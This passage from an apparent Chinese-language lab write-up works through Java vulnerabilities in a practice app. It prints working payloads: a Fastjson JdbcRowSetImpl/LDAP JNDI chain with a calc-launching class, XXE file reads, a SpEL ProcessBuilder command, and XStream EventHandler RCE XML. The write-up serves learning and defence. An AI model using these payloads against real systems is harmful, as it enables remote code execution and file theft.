<p>也就是说通过<strong>Feature.SupportNonPublicField</strong>我们可以实现对不可访问属性的反序列化</p>
<p>然后就是Fastjson的特殊解析了</p>
<p>Fastjson 在解析 JSON 时，若字段中包含 <code>@type</code>，会尝试根据该类型<strong>动态实例化对应的 Java 对象</strong>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.example.User&quot;</span>,</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">  <span class="string">&quot;age&quot;</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Fastjson 会尝试：</p>
<ol>
<li>反射调用 <code>com.example.User</code> 的无参构造函数创建对象。</li>
<li>通过 setter 或直接字段赋值到User类中（若开启 <code>Feature.SupportNonPublicField</code>）填充 <code>name</code> 和 <code>age</code>。</li>
</ol>
<p>也就是说我们如果想通过Fastjson进行反序列化漏洞我们就必须开启<code>Feature.SupportNonPublicField</code>然后通过@type进行对类通过反射进行实例化</p>
<p>我们将payload替换为Windows系统进行命令执行尝试</p>
<p>不知道为什么，妈的明明感觉payload没问题但就是一直他妈的报错，麻了。</p>
<p><code>com.alibaba.fastjson.JSONException: set property error, outputProperties</code> 错误，通常是因为 <strong>Fastjson 的反序列化漏洞防护机制被触发</strong>。具体原因是：<strong>传入的 JSON 数据包含恶意构造的字段（如 <code>outputProperties</code>），触发了 Fastjson 的防御机制</strong>。</p>
<p>看来直接通过反序列化进行命令执行被未知代码给阻拦了，只能去跟着别人的wp去看看了</p>
<p>首先就是通过dnslog去测试是否可以成功解析，也就是Fastjson能否使用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;name&quot;</span>:&#123;</span><br><span class="line"><span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,</span><br><span class="line"><span class="string">&quot;val&quot;</span>:<span class="string">&quot;p45ntb.dnslog.cn&quot;</span></span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="comment">//java.lang.ClassCastException: java.lang.String cannot be cast to com.alibaba.fastjson.JSONObject</span></span><br></pre></td></tr></table></figure>

<p>虽然返回我们的ip有问题，后面破案了原来是我们代码获取的是name字段所以我们需要将其通过json的格式放入name中，但是dnslog那边还是有访问记录</p>


<p>由于其禁用了我们直接进行命令执行的方法，我们只能通过和log4j一样的方法去实现访问我们设置好的恶意文件</p>
<p>先准备TouchFile打开计算器</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            <span class="comment">// 执行 calc.exe（Windows 计算器）</span></span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;calc.exe&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 静默处理异常，避免被发现</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后将其编译为class文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac TouchFile.java</span><br></pre></td></tr></table></figure>

<p>在通过不知道是什么原理的marshalsec，开启LDAP协议，于是我们可以通过LDAP协议去加载我们的恶意类</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://127.0.0.1:1999/#TouchFile&quot;</span></span><br><span class="line">Listening on 0.0.0.0:1389</span><br><span class="line">Send LDAP reference result <span class="keyword">for</span> TouchFile redirecting to http://127.0.0.1:1999/TouchFile.class</span><br></pre></td></tr></table></figure>

<p>这里已经有一条加载记录了，剩下的就是去json反序列化</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/TouchFile&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<ol>
<li><strong><code>@type</code></strong><ul>
<li>指定 Fastjson 反序列化的目标类为 <code>com.sun.rowset.JdbcRowSetImpl</code>（JDK 内置类）。</li>
<li>此类实现了 <code>DataSource</code> 接口，可通过 <code>dataSourceName</code> 属性触发 JNDI 查询。</li>
</ul>
</li>
<li><strong><code>dataSourceName</code></strong><ul>
<li>设置一个恶意的 JNDI 地址（如 <code>idap://127.0.0.1:1389/TouchFile</code>）。</li>
<li>当 <code>autoCommit</code> 被设置为 <code>true</code> 时，<code>JdbcRowSetImpl</code> 会自动尝试连接该地址，触发 JNDI 查询。</li>
</ul>
</li>
<li><strong><code>autoCommit:true</code></strong><ul>
<li>强制 <code>JdbcRowSetImpl</code> 初始化时调用 <code>setAutoCommit(true)</code>，内部会执行 <code>connect()</code> 方法，从而发起 JNDI 请求。</li>
</ul>
</li>
</ol>


<p>明明都弹计算器了，但是还是会报错，好傻逼的烟雾弹</p>
<h2 id="15-XXE"><a href="#15-XXE" class="headerlink" title="15.XXE"></a>15.XXE</h2><p>XXE(XML外部实体注入、XML External Entity），在应用程序解析XML输入时，当允许引用外部实体时，可以构造恶意内容导致读取任意文件或SSRF、端口探测、DoS拒绝服务攻击、执行系统命令、攻击内部网站等。</p>
<p>我记得都是通过引用外部实体的时候触发SSRF多一点，就像这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">    &lt;!ENTITY b SYSTEM &quot;file:///etc/hosts&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;b;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<p>自然这个基础靶场的payload应该也和这个差不多，也就只是审计一下代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@RequestMapping(value = &quot;/DocumentBuilder/xinclude/vuln&quot;, method = RequestMethod.POST)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">DocumentBuilderXincludeVuln</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> WebUtils.getRequestBody(request);</span><br><span class="line"><span class="comment">//获取到请求头中的body部分，即我们的xml数据</span></span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">            dbf.setXIncludeAware(<span class="literal">true</span>);   <span class="comment">// 支持XInclude</span></span><br><span class="line">            dbf.setNamespaceAware(<span class="literal">true</span>);  <span class="comment">// 支持XInclude</span></span><br><span class="line"><span class="comment">//初始化xml解释器</span></span><br><span class="line">            <span class="type">DocumentBuilder</span> <span class="variable">db</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">            <span class="type">StringReader</span> <span class="variable">sr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringReader</span>(body);</span><br><span class="line"><span class="comment">//将我们获取的字符串包装成字符输入流</span></span><br><span class="line">            <span class="type">InputSource</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>(sr);</span><br><span class="line"><span class="comment">//再将字符输入流包装成InputSource</span></span><br><span class="line"><span class="comment">//创建DocumentBuilder并解析XML</span></span><br><span class="line">            <span class="type">Document</span> <span class="variable">document</span> <span class="operator">=</span> db.parse(is);  <span class="comment">// parse xml  未禁用外部实体</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//处理解析后的DOM树然后返回响应</span></span><br><span class="line">            <span class="type">NodeList</span> <span class="variable">rootNodeList</span> <span class="operator">=</span> document.getChildNodes();</span><br><span class="line">            response(rootNodeList);</span><br><span class="line"></span><br><span class="line">            sr.close();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;DocumentBuilder xinclude xxe vuln code&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个代码就是获取的xml数据后启动xml解释器然后创建DocumentBuilder对象然后使用InputSource(java xml解析的标准输入包装类)</p>
<p>我们直接读取文件即可</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">joychou</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///D:\flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;xxe;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们还需要将content type改为xml，不然数据读取会出错</p>


<p>由于没有返回，所以我们只是在后台读取到了文件内容</p>
<h2 id="16-XSS"><a href="#16-XSS" class="headerlink" title="16.XSS"></a>16.XSS</h2><p>又是一个很经典但是CTF不怎么考的漏洞，主要是在用户的输入需要回显到前端界面的时候通过注入前端代码攻击的操作</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@RequestMapping(&quot;/reflect&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">reflect</span><span class="params">(String xss)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> xss;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//这个代码直接把获取的参数返回到了前端界面，直接注入即可</span></span><br></pre></td></tr></table></figure>

<p>我们直接来看修复代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/safe&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">safe</span><span class="params">(String xss)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> encode(xss);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">encode</span><span class="params">(String origin)</span> &#123;</span><br><span class="line">    origin = StringUtils.replace(origin, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;&amp;amp;&quot;</span>);</span><br><span class="line">    origin = StringUtils.replace(origin, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>);</span><br><span class="line">    origin = StringUtils.replace(origin, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>);</span><br><span class="line">    origin = StringUtils.replace(origin, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&amp;quot;&quot;</span>);</span><br><span class="line">    origin = StringUtils.replace(origin, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&amp;#x27;&quot;</span>);</span><br><span class="line">    origin = StringUtils.replace(origin, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;&amp;#x2F;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> origin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个就是对我们输入进行了一个替换，将危险字符替换为html转义字符，也就是保留文本内容但是不进行解析</p>
<table>
<thead>
<tr>
<th align="left">原始字符</th>
<th align="left">转义后的实体</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>&amp;</code></td>
<td align="left"><code>&amp;amp</code></td>
<td align="left">防止HTML实体截断</td>
</tr>
<tr>
<td align="left"><code>&lt;</code></td>
<td align="left"><code>&amp;lt</code></td>
<td align="left">防止标签注入（如<code>&lt;script&gt;</code>）</td>
</tr>
<tr>
<td align="left"><code>&gt;</code></td>
<td align="left"><code>&amp;gt</code></td>
<td align="left">防止标签闭合（如<code>&lt;/script&gt;</code>）</td>
</tr>
<tr>
<td align="left"><code>&quot;</code></td>
<td align="left"><code>&amp;quot</code></td>
<td align="left">防止属性值逃逸（如<code>onclick=</code>）</td>
</tr>
<tr>
<td align="left"><code>&#39;</code></td>
<td align="left"><code>&amp;#27</code></td>
<td align="left">防止单引号属性逃逸</td>
</tr>
<tr>
<td align="left"><code>/</code></td>
<td align="left"><code>&amp;#x2F</code></td>
<td align="left">防止自闭合标签（如<code>&lt;img/&gt;</code>）</td>
</tr>
</tbody></table>
<p>我在复制这个表格的时候发现自动将这些转义后的实体转化为对应字符了，需要自己写上</p>


<p>我们查看源代码发现是经过替换了，经过浏览器渲染后又变成文本了</p>


<p>好像之前看php代码中<code>highlight_file</code>也会对特殊字符进行转义处理</p>
<p>还有另外一种方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@RequestMapping(&quot;/stored/store&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">store</span><span class="params">(String xss, HttpServletResponse response)</span> &#123;</span><br><span class="line"><span class="comment">//获取参数xss和http响应</span></span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;xss&quot;</span>, xss)</span><br><span class="line"><span class="comment">//将我们的xss参数转化为cookie</span></span><br><span class="line">        response.addCookie(cookie);</span><br><span class="line"><span class="comment">//将这个cookie作为响应返回，这个cookie会储存到客户端在继续访问时携带</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Set param into cookie&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/stored/show&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">show</span><span class="params">(<span class="meta">@CookieValue(&quot;xss&quot;)</span> String xss)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> xss;</span><br><span class="line"><span class="comment">//这个读取当前的cookie然后返回到前端界面</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>根据这两个路由，攻击思路就是先通过xss参数写入cookie，然后再访问返回cookie路由就会实现xss注入</p>




<h2 id="17-SpEL"><a href="#17-SpEL" class="headerlink" title="17.SpEL"></a>17.SpEL</h2><p>Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@RequestMapping(&quot;/spel/vuln1&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">spel_vuln1</span><span class="params">(String value)</span> &#123;</span><br><span class="line"><span class="comment">//启动expression解释器</span></span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line"><span class="comment">//调用解释器对参数进行解析然后以字符串的形式返回</span></span><br><span class="line">        <span class="keyword">return</span> parser.parseExpression(value).getValue().toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>代码很简单，但是重点是多出来一个expression语言，到底有没有必要去学</p>
<p>payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="string">&quot;calc.exe&quot;</span>).start()</span><br></pre></td></tr></table></figure>

<p>这个就是直接实例化ProcessBuilder进行命令执行，和Groovy感觉没什么区别</p>


<p>当然如果输入正常的表达式也会进行解析然后返回计算值的</p>
<h2 id="18-XStreamRCE"><a href="#18-XStreamRCE" class="headerlink" title="18.XStreamRCE"></a>18.XStreamRCE</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/xstream&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">parseXml</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> WebUtils.getRequestBody(request);</span><br><span class="line">    <span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>(<span class="keyword">new</span> <span class="title class_">DomDriver</span>());</span><br><span class="line">    xstream.addPermission(AnyTypePermission.ANY); <span class="comment">// This will cause all XStream versions to be affected.</span></span><br><span class="line">    xstream.fromXML(xml);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;xstream&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个代码一看感觉就是简单的XXE漏洞，但是那样直接SSRF就太简单了，我们看名字为XStreamRCE应该是要通过xml进行命令执行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">XStream是一个简单的基于Java库，Java对象序列化到XML，反之亦然(即：可以轻易的将Java对象和xml文档相互转换)。</span><br><span class="line"></span><br><span class="line">Xstream具有以下优点</span><br><span class="line"></span><br><span class="line">使用方便 - XStream的API提供了一个高层次外观，以简化常用的用例。</span><br><span class="line">无需创建映射 - XStream的API提供了默认的映射大部分对象序列化。</span><br><span class="line">性能 - XStream快速和低内存占用，适合于大对象图或系统。</span><br><span class="line">干净的XML - XStream创建一个干净和紧凑XML结果，这很容易阅读。</span><br><span class="line">不需要修改对象 - XStream可序列化的内部字段，如私有和最终字段，支持非公有制和内部类。默认构造函数不是强制性的要求。</span><br><span class="line">完整对象图支持 - XStream允许保持在对象模型中遇到的重复引用，并支持循环引用。</span><br><span class="line">可自定义的转换策略 - 定制策略可以允许特定类型的定制被表示为XML的注册。</span><br><span class="line">安全框架 - XStream提供了一个公平控制有关解组的类型，以防止操纵输入安全问题。</span><br><span class="line">错误消息 - 出现异常是由于格式不正确的XML时，XStream抛出一个统一的例外，提供了详细的诊断，以解决这个问题。</span><br><span class="line">另一种输出格式 - XStream支持其它的输出格式，如JSON。</span><br></pre></td></tr></table></figure>

<p>也就是说可以将xml文档转换为java对象，然后通过反序列化进行命令执行</p>
<p>我服了，java反序列化我到现在都没弄明白，现在要通过xml进行反序列化进行命令执行，而且还不能用脚本自动生成pop链，完全看不懂啊</p>
<p>原理是一下子看不懂的了，先抄一个payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span> <span class="comment">&lt;!-- --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>/System/Applications/Calculator.app<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个是linux系统中使用的命令执行，在windows系统中没有open，得改为cmd.exe</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span> <span class="comment">&lt;!-- --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>cmd.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>任重而道远，我知道这些现在我是肯定看不懂的就不浪费时间了</p>
<h2 id="19-log4j"><a href="#19-log4j" class="headerlink" title="19.log4j"></a>19.log4j</h2><p>第一次看见这么新的漏洞CVE21年的，这么基础靶场会有怎么难的漏洞，第一次看见几年前的RCE漏洞</p>
<h3 id="1-JNDI"><a href="#1-JNDI" class="headerlink" title="1.JNDI"></a>1.JNDI</h3><p>JNDI(Java Naming and Directory Interface) 是 Java 平台提供的一个 <strong>命名和目录服务</strong> 的标准 API，它允许 Java 应用程序通过统一的接口访问各种命名和目录服务。</p>
<p>JNDI 架构分为三层：</p>
<ul>
<li>JNDI API：与 Java 应用程序通信，提供编程接口，隔离应用与数据源</li>
<li>Naming Manager：命名服务管理器</li>
<li>JNDI SPI：与具体实现方法（服务）相连接</li>
</ul>
<p>JNDI 支持的服务有很多，比如 RMI、LDAP、DNS 等服务。JNDI 封装了这些服务，使得可以通过类似的代码访问这些服务（调用容器环境的 Context 的 lookup 方法）</p>
